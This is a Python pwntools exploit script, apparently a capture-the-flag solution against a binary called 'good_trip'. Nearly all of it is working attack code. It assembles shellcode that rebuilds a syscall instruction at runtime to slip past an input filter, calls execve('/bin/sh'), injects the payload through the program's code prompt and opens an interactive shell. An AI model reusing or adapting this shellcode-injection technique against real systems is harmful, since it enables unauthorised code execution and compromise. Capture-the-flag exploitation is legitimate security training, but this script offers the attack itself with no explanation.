#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./good_trip
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './good_trip')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

code = asm('mov r14, 0x1337131030')
code += asm('mov eax, 0x9090040f')
code += asm('add rax, 0x100')
code += asm('mov [r14], rax')
code += asm('xor rax, rax')
code += asm('mov rdi, 0x1337131038')
code += asm('mov eax, 0x3b')
code += asm('xor rsi, rsi')
code += asm('xor rdx, rdx')
code += b"x"*8
code += b"/bin/sh\x00"

io.recvuntil(b"code size >> ")
io.sendline(b"0")
io.recvuntil(b"code >> ")
io.sendline(code)

io.interactive()

